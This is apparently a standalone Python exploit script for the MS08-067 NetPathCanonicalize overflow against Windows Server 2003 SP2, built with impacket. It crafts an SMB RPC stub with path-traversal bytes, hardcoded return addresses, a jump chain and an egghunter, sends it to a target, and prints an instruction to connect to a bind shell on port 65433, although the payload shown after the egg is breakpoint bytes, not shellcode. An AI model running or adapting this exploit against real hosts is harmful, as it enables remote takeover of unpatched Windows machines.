#!/usr/bin/python

from impacket import smb
from impacket import uuid
import impacket.dcerpc.v5
from impacket.dcerpc.v5 import transport
import sys

print ("MS08-067 win2k3sp2")
print ("I love you Alison Thompson OAM")
print ("@r0ss1n1 // Charles Truscott")

try:
  target = sys.argv[1]
  port = 445
except IndexError:
  print ("Usage: %s host" % sys.argv[0])
  
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()

dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

breakpoints = "\xCC" * 336

stub = '\x01\x00\x00\x00'
stub += '\xb6\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\xb6\x00\x00\x00'

stub += 'w00tw00t' + '\x90' * 16 + breakpoints

stub += '\x00\x00\x00\x00'
stub += '\x2f\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x2f\x00\x00\x00'

stub += '\x41\x00\x5c\x00\x2e\x00\x2e\00'
stub += '\x5c\x00\x2e\x00\x2e\x00\x5c\00'
stub += '\x41\x41'
stub += '\x1b\xa0\x86\x7c'
stub += '\x41\x41\x41\x41'
stub += '\xeb\x1c\x90\x90'
stub += '\x41\x41\x41\x41'
stub += '\x84\x94\x80\x7c'
stub += '\xFF\xFF\xFF\xFF'
stub += '\xa2\x83\xe0\x77'
stub += '\x17\xf5\x83\x7c'

#stub += '\xCC" * 40

stub += '\x90\x90\x90\x90'
stub += '\x90\x90\x90\x90'

egghunter = "\x33\xd2\x90\x90\x90\x42\x52\x6a\x02"
egghunter+= "\x58\xcd\x2e\x3c\x05\x5a\x74\xf4\xb8"
egghunter+= "\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea"
egghunter+= "\xaf\x75\xe7\xff\xe7"

stub += egghunter

stub += '\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x5c\x00\x00\x00'
stub += '\x01\x00\x00\x00'
stub += '\x01\x00\x00\x00'

print ("sending NetPathCanonicalize packet")
dce.call(0x1f, stub)
print ("connect to bind shell port 65433")
